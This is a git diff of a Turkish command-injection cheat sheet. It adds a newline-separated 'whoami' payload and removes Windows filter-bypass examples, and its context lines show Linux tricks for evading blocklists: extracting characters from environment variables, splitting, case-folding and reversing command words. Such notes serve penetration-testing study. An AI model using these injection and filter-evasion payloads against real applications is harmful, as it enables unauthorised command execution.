@@ -49,6 +49,7 @@ Bu istek çalışacaktır çünkü kullanıcı girdisi üzerinde herhangi bir fi
 `whoami`
 $(whoami)
 || whoami
+\n whoami
 ```
 
 ## Blind Command Injection
@@ -86,18 +87,10 @@ Bazı filtreler ;, / veya belirli karakterleri engeller. Karakterleri substring 
 ```bash
 echo ${PATH:0:1}   # PATH değişkeninin ilk karakteri
 ```
-- Windows %HOMEPATH%:
-```powershell
-echo %HOMEPATH:~6,-11%
-```
 
 - ; karakteri (Linux):
 ```bash
 echo ${LS_COLORS:10:1}
-```
-- ; karakteri (Windows PowerShell):
-```powershell
-$env:HOMEPATH[0]
 ```
 3. Blacklist Komutları Bypasslamak
 - Mantık: Filtre belirli kelimeleri engelliyorsa, stringi parçalayıp yeniden birleştirebiliriz.
@@ -111,12 +104,6 @@ who$@ami
 $(a="WhOaMi"; printf %s "${a,,}")
 ```
 
-Windows Örnekleri:
-```bash
-who^ami
-$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
-$(a="WhOaMi"; printf %s "${a,,}")
-```
 ## rev Komutu
 - Mantık: Filtre belirli komut kelimelerini engelliyorsa, kelimeyi ters yazıp rev ile düzeltebiliriz.
 
